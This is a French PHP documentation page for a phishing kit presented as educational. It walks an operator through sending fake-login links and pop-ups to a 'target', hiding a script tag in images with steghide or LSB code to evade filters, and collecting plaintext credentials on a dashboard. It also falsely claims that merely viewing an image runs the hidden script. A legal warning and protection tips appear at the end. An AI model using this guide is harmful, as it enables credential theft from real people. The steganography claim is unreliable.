<?php
// Page de documentation - Guide complet d'utilisation
// Accès: /messagerie/codes/fake_login/docs.php

session_start();

// Vérifier que l'utilisateur est connecté
if (!isset($_SESSION["user_id"])) {
    header("Location: ../login.php");
    exit();
}

$user_id = $_SESSION["user_id"];

// Variables pour les URLs
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
$host = $_SERVER['HTTP_HOST'];
$baseUrl = $protocol . "://" . $host . "/messagerie";

?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Documentation Complète - Phishing Éducatif</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f7fa;
            color: #333;
            line-height: 1.6;
        }
        
        .sidebar {
            position: fixed;
            left: 0;
            top: 0;
            width: 250px;
            height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            overflow-y: auto;
            padding-top: 20px;
            z-index: 1000;
        }
        
        .sidebar h3 {
            padding: 0 20px;
            margin-bottom: 20px;
            font-size: 16px;
        }
        
        .sidebar a {
            display: block;
            padding: 12px 20px;
            color: white;
            text-decoration: none;
            border-left: 3px solid transparent;
            transition: all 0.3s;
        }
        
        .sidebar a:hover,
        .sidebar a.active {
            background: rgba(255, 255, 255, 0.1);
            border-left-color: white;
        }
        
        .main {
            margin-left: 250px;
            padding: 40px;
            max-width: 900px;
        }
        
        .section {
            background: white;
            padding: 30px;
            margin-bottom: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
        }
        
        h1 {
            color: #667eea;
            margin-bottom: 20px;
            font-size: 28px;
        }
        
        h2 {
            color: #764ba2;
            margin: 25px 0 15px 0;
            font-size: 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #f0f0f0;
        }
        
        h3 {
            color: #667eea;
            margin: 20px 0 10px 0;
            font-size: 16px;
        }
        
        .code-block {
            background: #f5f5f5;
            border-left: 4px solid #667eea;
            padding: 15px;
            margin: 15px 0;
            border-radius: 5px;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }
        
        .cmd {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 15px;
            margin: 15px 0;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            overflow-x: auto;
        }
        
        .info-box {
            background: #e8f4f8;
            border: 1px solid #b3dfe8;
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
            color: #2c5aa0;
        }
        
        .warning-box {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
            color: #856404;
        }
        
        .success-box {
            background: #d4edda;
            border: 1px solid #c3e6cb;
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
            color: #155724;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 15px 0;
        }
        
        table th, table td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        
        table th {
            background: #f5f5f5;
            font-weight: bold;
            color: #667eea;
        }
        
        table tr:hover {
            background: #f9f9f9;
        }
        
        ol, ul {
            margin-left: 20px;
            margin: 15px 0;
        }
        
        li {
            margin: 8px 0;
        }
        
        .step {
            background: #f9f9f9;
            padding: 20px;
            margin: 15px 0;
            border-left: 4px solid #667eea;
            border-radius: 5px;
        }
        
        .step h4 {
            color: #667eea;
            margin-bottom: 10px;
        }
        
        .button-group {
            display: flex;
            gap: 10px;
            margin: 20px 0;
            flex-wrap: wrap;
        }
        
        .btn {
            padding: 10px 20px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            transition: background 0.3s;
        }
        
        .btn:hover {
            background: #764ba2;
        }
        
        .btn-secondary {
            background: #95a5a6;
        }
        
        .btn-secondary:hover {
            background: #7f8c8d;
        }
    </style>
</head>
<body>
    <div class="sidebar">
        <h3>📚 Documentation</h3>
        <a href="#overview" onclick="scrollTo('overview')" class="active">Vue d'ensemble</a>
        <a href="#quickstart" onclick="scrollTo('quickstart')">Démarrage rapide</a>
        <a href="#methods" onclick="scrollTo('methods')">Méthodes d'attaque</a>
        <a href="#steganography" onclick="scrollTo('steganography')">Stéganographie</a>
        <a href="#technical" onclick="scrollTo('technical')">Détails techniques</a>
        <a href="#security" onclick="scrollTo('security')">Sécurité & Éthique</a>
        <a href="#faq" onclick="scrollTo('faq')">FAQ</a>
    </div>
    
    <div class="main">
        <!-- Overview -->
        <div class="section" id="overview">
            <h1>📖 Documentation Complète - Phishing Éducatif</h1>
            
            <h2>Vue d'ensemble</h2>
            <p>
                Ce système démontre les techniques de phishing dans un contexte éducatif et contrôlé.
                Il permet aux étudiants et chercheurs de comprendre:
            </p>
            <ul>
                <li>Comment fonctionne une attaque de phishing</li>
                <li>L'utilisation de la stéganographie pour cacher du code</li>
                <li>La capture d'identifiants</li>
                <li>Les vulnérabilités des utilisateurs</li>
                <li>Les mesures de protection</li>
            </ul>
            
            <div class="info-box">
                <strong>ℹ️ Important:</strong> Ce système est conçu UNIQUEMENT pour la démonstration 
                éducative dans un environnement contrôlé (classe, labo). Ne l'utilisez JAMAIS contre 
                des personnes réelles.
            </div>
        </div>
        
        <!-- Quick Start -->
        <div class="section" id="quickstart">
            <h2>🚀 Démarrage Rapide</h2>
            
            <h3>En 3 étapes simples:</h3>
            
            <div class="step">
                <h4>Étape 1: Générer votre lien</h4>
                <p>Accédez à votre <strong>helper.php</strong> pour générer les URLs</p>
                <p style="margin-top: 10px;">
                    <a href="helper.php" class="btn" target="_blank">📌 Ouvrir le générateur</a>
                </p>
            </div>
            
            <div class="step">
                <h4>Étape 2: Envoyer le lien</h4>
                <p>
                    Copiez le lien généré et envoyez-le à votre cible via:
                </p>
                <ul>
                    <li>La messagerie du système</li>
                    <li>Email</li>
                    <li>Chat</li>
                    <li>Dans une image stéganographiée</li>
                </ul>
            </div>
            
            <div class="step">
                <h4>Étape 3: Consulter les résultats</h4>
                <p>Les identifiants capturés apparaîtront automatiquement sur votre dashboard:</p>
                <p style="margin-top: 10px;">
                    <a href="dashboard.php" class="btn" target="_blank">📊 Ouvrir le Dashboard</a>
                </p>
            </div>
        </div>
        
        <!-- Methods -->
        <div class="section" id="methods">
            <h2>🎯 Méthodes d'Attaque</h2>
            
            <h3>Méthode 1: Pop-up de Fausse Connexion</h3>
            <p><strong>Comment ça marche:</strong></p>
            <ol>
                <li>La victime reçoit un lien</li>
                <li>Clique sur le lien</li>
                <li>Un pop-up s'affiche immédiatement</li>
                <li>Elle rentre ses identifiants</li>
                <li>Les identifiants sont capturés</li>
            </ol>
            
            <p><strong>Avantages:</strong></p>
            <ul>
                <li>Rapide et direct</li>
                <li>Taux de succès élevé</li>
                <li>Simple à mettre en place</li>
            </ul>
            
            <div class="code-block">
<?php echo htmlspecialchars($baseUrl); ?>/codes/assets/popup.js?sender=<?php echo $user_id; ?>
            </div>
            
            <hr style="margin: 20px 0;">
            
            <h3>Méthode 2: Page Fausse de Connexion</h3>
            <p><strong>Comment ça marche:</strong></p>
            <ol>
                <li>La victime reçoit un lien vers une "fausse page de connexion"</li>
                <li>La page ressemble exactement à la vraie</li>
                <li>Elle rentre ses identifiants</li>
                <li>Les identifiants sont capturés et elle est redirigée</li>
            </ol>
            
            <p><strong>Avantages:</strong></p>
            <ul>
                <li>Plus convaincant qu'un pop-up</li>
                <li>URL personnalisée</li>
                <li>Aucun blocage par les pop-up</li>
            </ul>
            
            <div class="code-block">
<?php echo htmlspecialchars($baseUrl); ?>/codes/fake_login/index.php?sender=<?php echo $user_id; ?>
            </div>
            
            <hr style="margin: 20px 0;">
            
            <h3>Méthode 3: Stéganographie (Image cachée)</h3>
            <p><strong>Comment ça marche:</strong></p>
            <ol>
                <li>On cache le script JavaScript dans une image</li>
                <li>La victime reçoit l'image</li>
                <li>Quand elle visualise ou télécharge l'image, le script s'exécute</li>
                <li>Le pop-up s'affiche</li>
                <li>Les identifiants sont capturés</li>
            </ol>
            
            <p><strong>Avantages:</strong></p>
            <ul>
                <li>Plus discret - pas de lien suspect</li>
                <li>Difficile à détecter</li>
                <li>Contournement des filtres</li>
            </ul>
        </div>
        
        <!-- Steganography -->
        <div class="section" id="steganography">
            <h2>🖼️ Guide de Stéganographie</h2>
            
            <p>
                La stéganographie est l'art de cacher une information (ici, du code) 
                à l'intérieur d'une autre (une image).
            </p>
            
            <h3>Outils disponibles:</h3>
            
            <table>
                <thead>
                    <tr>
                        <th>Outil</th>
                        <th>Type</th>
                        <th>Plateforme</th>
                        <th>Facilité</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td><strong>SilentEye</strong></td>
                        <td>GUI</td>
                        <td>Windows, Mac, Linux</td>
                        <td>⭐⭐⭐⭐⭐</td>
                    </tr>
                    <tr>
                        <td><strong>Steghide</strong></td>
                        <td>CLI</td>
                        <td>Linux, Windows</td>
                        <td>⭐⭐⭐</td>
                    </tr>
                    <tr>
                        <td><strong>OpenStego</strong></td>
                        <td>GUI</td>
                        <td>Java (Multi-platform)</td>
                        <td>⭐⭐⭐⭐</td>
                    </tr>
                    <tr>
                        <td><strong>LSB-Steganography</strong></td>
                        <td>Python</td>
                        <td>Tous</td>
                        <td>⭐⭐⭐</td>
                    </tr>
                </tbody>
            </table>
            
            <h3>Tutoriel: Utiliser SilentEye (GUI)</h3>
            
            <div class="step">
                <h4>1. Télécharger et installer SilentEye</h4>
                <div class="cmd">
# Télécharger depuis: https://www.silenteye.org/
# Ou via package manager:
apt-get install silenteye
                </div>
            </div>
            
            <div class="step">
                <h4>2. Créer un fichier de script</h4>
                <p>Créez un fichier <code>script.js</code> contenant:</p>
                <div class="code-block">
&lt;script src="<?php echo htmlspecialchars($baseUrl); ?>/codes/assets/popup.js?sender=<?php echo $user_id; ?>"&gt;&lt;/script&gt;
                </div>
            </div>
            
            <div class="step">
                <h4>3. Lancer SilentEye</h4>
                <ul>
                    <li>Ouvrir SilentEye</li>
                    <li>Sélectionner "Encode"</li>
                    <li>Choisir l'image (PNG, BMP, JPG)</li>
                    <li>Sélectionner le fichier script.js</li>
                    <li>Ajouter un mot de passe (optionnel)</li>
                    <li>Cliquer "Encoder"</li>
                </ul>
            </div>
            
            <div class="step">
                <h4>4. Récupérer l'image stéganographiée</h4>
                <p>Une nouvelle image sera créée avec le script caché à l'intérieur.</p>
            </div>
            
            <h3>Tutoriel: Utiliser Steghide (CLI)</h3>
            
            <div class="step">
                <h4>Installation:</h4>
                <div class="cmd">
# Ubuntu/Debian
sudo apt-get install steghide

# Vérifier l'installation
steghide --version
                </div>
            </div>
            
            <div class="step">
                <h4>Encoder un fichier dans une image:</h4>
                <div class="cmd">
# Créer le fichier de script
echo '&lt;script src="<?php echo htmlspecialchars($baseUrl); ?>/codes/assets/popup.js?sender=<?php echo $user_id; ?>"&gt;&lt;/script&gt;' > script.js

# Encoder dans une image
steghide embed -cf image.jpg -ef script.js -sf output.jpg -p "password123"

# -cf: fichier image source
# -ef: fichier à encoder
# -sf: fichier de sortie
# -p: mot de passe
                </div>
            </div>
            
            <div class="step">
                <h4>Décoder l'image (pour tester):</h4>
                <div class="cmd">
steghide extract -sf output.jpg -xf extracted.js -p "password123"
                </div>
            </div>
            
            <h3>Tutoriel: Python LSB</h3>
            
            <div class="step">
                <h4>Installer les dépendances:</h4>
                <div class="cmd">
pip install pillow
                </div>
            </div>
            
            <div class="step">
                <h4>Script Python:</h4>
                <div class="code-block">
from PIL import Image

def encode_lsb(image_path, message, output_path):
    img = Image.open(image_path).convert('RGB')
    pixels = img.load()
    
    # Convertir le message en binaire
    msg_binary = ''.join(format(ord(char), '08b') for char in message)
    msg_binary += '1111111111111110'  # Délimiteur
    
    idx = 0
    for y in range(img.height):
        for x in range(img.width):
            if idx < len(msg_binary):
                r, g, b = pixels[x, y][:3]
                bit = int(msg_binary[idx])
                r = (r & 0xFE) | bit
                pixels[x, y] = (r, g, b)
                idx += 1
    
    img.save(output_path)

# Utilisation
message = '&lt;script src="...popup.js..."&gt;&lt;/script&gt;'
encode_lsb('input.png', message, 'output.png')
                </div>
            </div>
            
            <div class="info-box">
                <strong>💡 Conseil:</strong> Utilisez des images JPG/PNG de haute qualité pour 
                minimiser les distorsions visuelles. Les images compressées peuvent perdre le message.
            </div>
        </div>
        
        <!-- Technical -->
        <div class="section" id="technical">
            <h2>⚙️ Détails Techniques</h2>
            
            <h3>Flux de données:</h3>
            
            <div class="code-block" style="line-height: 1.8;">
Victime clique sur le lien
         ↓
Browser charge popup.js
         ↓
Script exécute createPhishingPopup()
         ↓
Pop-up s'affiche
         ↓
Victime rentre identifiants
         ↓
Formulaire envoyé à phishing.php (POST)
         ↓
Identifiants insérés en DB
         ↓
Attaquant voit les données sur son dashboard
            </div>
            
            <h3>Base de données:</h3>
            
            <p>Table <code>phishing_captures</code>:</p>
            
            <div class="code-block">
CREATE TABLE phishing_captures (
    id INT AUTO_INCREMENT PRIMARY KEY,
    sender_id INT NOT NULL,
    captured_username VARCHAR(255) NOT NULL,
    captured_password VARCHAR(255) NOT NULL,
    captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    ip_address VARCHAR(45),
    user_agent TEXT,
    FOREIGN KEY (sender_id) REFERENCES users(id)
);
            </div>
            
            <h3>Flux de fichiers:</h3>
            
            <table>
                <thead>
                    <tr>
                        <th>Fichier</th>
                        <th>Fonction</th>
                        <th>Appelé par</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td><code>popup.js</code></td>
                        <td>Affiche le pop-up</td>
                        <td>Directement via &lt;script&gt;</td>
                    </tr>
                    <tr>
                        <td><code>fake_login/index.php</code></td>
                        <td>Page fausse connexion</td>
                        <td>Lien direct</td>
                    </tr>
                    <tr>
                        <td><code>fake_login/phishing.php</code></td>
                        <td>Capture les identifiants</td>
                        <td>POST du formulaire</td>
                    </tr>
                    <tr>
                        <td><code>fake_login/dashboard.php</code></td>
                        <td>Affiche les résultats</td>
                        <td>Accès direct</td>
                    </tr>
                </tbody>
            </table>
        </div>
        
        <!-- Security -->
        <div class="section" id="security">
            <h2>🔐 Sécurité & Éthique</h2>
            
            <div class="warning-box">
                <strong>⚠️ AVERTISSEMENT LÉGAL:</strong>
                <ul>
                    <li>N'utilisez PAS ce système contre des personnes réelles</li>
                    <li>Ne pas violer la loi informatique locale</li>
                    <li>Usage académique UNIQUEMENT</li>
                    <li>Obtenez la permission avant de tester</li>
                    <li>Vous êtes responsable de vos actions</li>
                </ul>
            </div>
            
            <h3>Limitations intentionnelles (pour la démo):</h3>
            <ul>
                <li>❌ Pas de chiffrement des mots de passe</li>
                <li>❌ Pas de SSL/TLS</li>
                <li>❌ Pas de validation CSRF</li>
                <li>❌ Pas de rate-limiting</li>
                <li>❌ Pas de chiffrement en transit</li>
            </ul>
            
            <h3>Mesures de sécurité dans un vrai système:</h3>
            <ul>
                <li>✓ Hachage bcrypt des mots de passe</li>
                <li>✓ HTTPS/TLS obligatoire</li>
                <li>✓ Tokens CSRF</li>
                <li>✓ Rate-limiting/Brute-force protection</li>
                <li>✓ Logs d'audit</li>
                <li>✓ 2FA (Double authentification)</li>
                <li>✓ Détection d'anomalies</li>
            </ul>
            
            <h3>Comment se protéger du phishing:</h3>
            <ul>
                <li>🛡️ Vérifier l'URL avant de cliquer</li>
                <li>🛡️ Chercher le cadenas HTTPS</li>
                <li>🛡️ Ne pas faire confiance aux pop-ups</li>
                <li>🛡️ Utiliser un gestionnaire de mots de passe</li>
                <li>🛡️ Activer la 2FA</li>
                <li>🛡️ Être méfiant des messages suspects</li>
                <li>🛡️ Signaler les tentatives de phishing</li>
            </ul>
        </div>
        
        <!-- FAQ -->
        <div class="section" id="faq">
            <h2>❓ FAQ</h2>
            
            <h3>Q: Le pop-up peut-il être bloqué?</h3>
            <p>
                <strong>R:</strong> Oui, certains navigateurs bloquent les pop-ups. C'est pourquoi la méthode 
                de page fausse est plus fiable. Les modernes bloqueurs de popup ne bloquent que les vrais pop-ups 
                créés avec <code>window.open()</code>, pas les overlays en div.
            </p>
            
            <h3>Q: Comment extraire le message d'une image stéganographiée?</h3>
            <p>
                <strong>R:</strong> Avec Steghide: <code>steghide extract -sf image.jpg</code>
            </p>
            
            <h3>Q: Les identifiants sont-ils chiffrés?</h3>
            <p>
                <strong>R:</strong> Non, c'est une démo. En production, vous utiliseriez HTTPS/SSL et hacheriez 
                les mots de passe avec bcrypt ou Argon2.
            </p>
            
            <h3>Q: Puis-je modifier le design du pop-up?</h3>
            <p>
                <strong>R:</strong> Oui, éditez <code>popup.js</code> pour changer les couleurs, texte, styles CSS, etc.
            </p>
            
            <h3>Q: Comment puis-je automatiser la stéganographie?</h3>
            <p>
                <strong>R:</strong> Écrivez un script Python qui utilise Steghide ou la bibliothèque PIL:
            </p>
            <div class="code-block">
import subprocess
subprocess.run(['steghide', 'embed', '-cf', 'image.jpg', '-ef', 'script.js', '-sf', 'output.jpg', '-p', 'password'])
            </div>
            
            <h3>Q: Puis-je utiliser d'autres images que JPG/PNG?</h3>
            <p>
                <strong>R:</strong> Oui, BMP, GIF fonctionnent aussi. Évitez les images compressées (JPEG très compressé).
            </p>
            
            <h3>Q: Comment tester sans victime réelle?</h3>
            <p>
                <strong>R:</strong> Utilisez un autre navigateur, une fenêtre privée, ou une machine virtuelle.
            </p>
        </div>
        
        <!-- Quick Links -->
        <div class="section">
            <h2>🔗 Accès Rapide</h2>
            
            <div class="button-group">
                <a href="helper.php" class="btn" target="_blank">📌 Générateur de Liens</a>
                <a href="dashboard.php" class="btn" target="_blank">📊 Mon Dashboard</a>
                <a href="index.php" class="btn btn-secondary" target="_blank">👁️ Prévisualiser (Fake Login)</a>
            </div>
        </div>
    </div>
    
    <script>
        function scrollTo(id) {
            const element = document.getElementById(id);
            if (element) {
                element.scrollIntoView({ behavior: 'smooth' });
            }
        }
        
        // Mettre à jour le lien actif dans la sidebar
        window.addEventListener('scroll', () => {
            const sections = document.querySelectorAll('.section');
            let current = '';
            
            sections.forEach(section => {
                const sectionTop = section.offsetTop;
                if (pageYOffset >= sectionTop - 60) {
                    current = section.getAttribute('id');
                }
            });
            
            document.querySelectorAll('.sidebar a').forEach(link => {
                link.classList.remove('active');
                if (link.getAttribute('href').slice(1) === current) {
                    link.classList.add('active');
                }
            });
        });
    </script>
</body>
</html>
